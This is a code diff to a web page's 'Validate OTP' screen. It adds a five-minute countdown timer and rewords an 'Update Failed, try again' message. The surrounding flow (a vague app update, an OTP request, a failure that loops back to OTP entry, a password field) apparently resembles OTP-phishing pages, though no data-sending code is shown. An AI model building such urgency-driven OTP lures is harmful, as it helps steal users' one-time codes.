@@ -66,6 +66,31 @@ input::placeholder { color: #aaa; }
 .bottom-btn { flex: 1; max-width: 175px; background: white; border: none; border-radius: 16px; padding: 14px 10px; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; box-shadow: 0 2px 12px rgba(0,0,0,0.12); font-family: inherit; font-size: 13px; font-weight: 700; color: #222; }
 .bottom-btn svg { width: 22px; height: 22px; stroke: #333; fill: none; stroke-width: 1.8; }
 
+
+/* ===== TIMER ===== */
+.timer-wrap {
+  text-align: center;
+  margin-bottom: 16px;
+  display: none;
+}
+.timer-text {
+  font-size: 13px;
+  color: #555;
+  margin-bottom: 6px;
+}
+.timer-count {
+  font-size: 28px;
+  font-weight: 800;
+  color: #c0392b;
+  letter-spacing: 2px;
+}
+.timer-count.green { color: #27ae60; }
+.timer-expired {
+  font-size: 13px;
+  color: #c0392b;
+  font-weight: 600;
+  display: none;
+}
 /* ===== TOAST ===== */
 .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%); color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; font-weight: 700; z-index: 9999; opacity: 0; transition: opacity 0.35s; pointer-events: none; white-space: nowrap; max-width: 90vw; text-align: center; }
 .toast.show { opacity: 1; }
@@ -118,6 +143,13 @@ input::placeholder { color: #aaa; }
   <div class="card">
     <h1>Validate OTP</h1>
     <p>Please enter the OTP sent to your registered email or mobile number.</p>
+
+    <!-- Timer -->
+    <div class="timer-wrap" id="timerWrap">
+      <div class="timer-text">OTP expires in:</div>
+      <div class="timer-count" id="timerCount">05:00</div>
+      <div class="timer-expired" id="timerExpired">⚠️ OTP has expired! Please try again.</div>
+    </div>
     <label>OTP:</label>
     <div class="input-wrap">
       <input type="text" id="otp" placeholder="• • • • • •" maxlength="6" autocomplete="off">
@@ -161,7 +193,7 @@ input::placeholder { color: #aaa; }
   <div class="error-box">
     <div class="error-icon">⚠️</div>
     <div class="error-title">Update Failed!</div>
-    <div class="error-msg">Your app option has not been updated successfully.<br><br>Please try again.</div>
+    <div class="error-msg">Your app option could not be updated.<br><br>Kindly try again.</div>
     <button class="btn-retry" onclick="retryOTP()">Try Again</button>
   
     <!-- Notice Box -->
@@ -237,6 +269,7 @@ input::placeholder { color: #aaa; }
     setTimeout(() => {
       hideAll();
       document.getElementById('page-otp').classList.add('active');
+      startTimer();
       // Reset animation for next use
       document.getElementById('prog1').style.transition = 'none';
       document.getElementById('prog1').style.width = '0%';
@@ -289,6 +322,48 @@ input::placeholder { color: #aaa; }
     document.getElementById('otp').value = '';
     hideAll();
     document.getElementById('page-otp').classList.add('active');
+  }
+
+
+  // ===== TIMER =====
+  let timerInterval = null;
+
+  function startTimer() {
+    let seconds = 300; // 5 minutes
+    const timerWrap = document.getElementById('timerWrap');
+    const timerCount = document.getElementById('timerCount');
+    const timerExpired = document.getElementById('timerExpired');
+    const btnUpdate = document.querySelector('#page-otp .btn-main');
+
+    timerWrap.style.display = 'block';
+    timerExpired.style.display = 'none';
+    timerCount.style.display = 'block';
+    timerCount.className = 'timer-count';
+
+    if (timerInterval) clearInterval(timerInterval);
+
+    timerInterval = setInterval(() => {
+      seconds--;
+      const mins = Math.floor(seconds / 60);
+      const secs = seconds % 60;
+      timerCount.textContent = 
+        String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+
+      // Turn green when less than 1 minute
+      if (seconds <= 60) {
+        timerCount.className = 'timer-count green';
+      }
+      // Turn red when less than 30 seconds
+      if (seconds <= 30) {
+        timerCount.className = 'timer-count';
+      }
+
+      if (seconds <= 0) {
+        clearInterval(timerInterval);
+        timerCount.style.display = 'none';
+        timerExpired.style.display = 'block';
+      }
+    }, 1000);
   }
 
   // ===== PASSWORD TOGGLE =====
